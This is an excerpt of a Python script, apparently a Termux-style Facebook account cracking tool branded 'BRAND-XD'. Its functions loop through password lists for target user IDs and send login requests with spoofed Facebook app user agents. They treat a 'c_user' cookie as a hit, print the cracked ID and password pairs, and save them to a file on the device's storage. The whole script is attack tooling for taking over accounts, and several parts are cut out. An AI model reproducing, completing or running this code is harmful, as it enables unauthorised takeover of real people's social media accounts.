...
logo=("""
 ...
 .########..##.....##.##.....##.##....##.########.
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : BRAND-XD
\033[97;1m>>     Facebook : MEHEDI HASAN TONU
\033[97;1m>>     Version  : 0.0.1
\033[97;1m>>     Tools    : BRAND-PRO
\033[92;1m>>     ToolTyp  : \x1b[91;1m TRIAL 
\033[91;1m--------------------------------------------------""")
def linex():
	print('\033[91;1m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> .BRAND  VERSION :\x1b[1;92m 1.1 ')
			print('>>>Tol Typ : \x1b[91;1m TRIAL')
			linex()
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://www.facebook.com/groups/569978438358911/?ref=share&mibextid=NSMWBT);menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[BRAND-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				open('\x1b[91;1m/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[BRAND-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mBRAND\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 13; CPH2483 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[BRAND-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[BRAND-OK] '+uid+' | '+ps+'\33[0;97m')
